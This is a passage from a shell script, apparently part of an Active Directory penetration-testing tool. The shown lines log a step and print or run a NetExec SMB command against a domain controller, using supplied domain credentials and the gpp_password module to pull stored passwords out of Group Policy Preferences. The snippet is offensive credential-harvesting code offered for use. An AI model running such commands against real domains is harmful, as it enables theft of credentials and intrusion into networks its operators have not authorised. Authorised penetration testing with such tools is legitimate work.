	logger "
[*] Looking for passwords in GPPs..." "yellow"
	printOrExecute "$NETEXEC smb '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M gpp_password --threads $NETEXECTHREADS" "$MODE" "nxc_gpp_password.out"
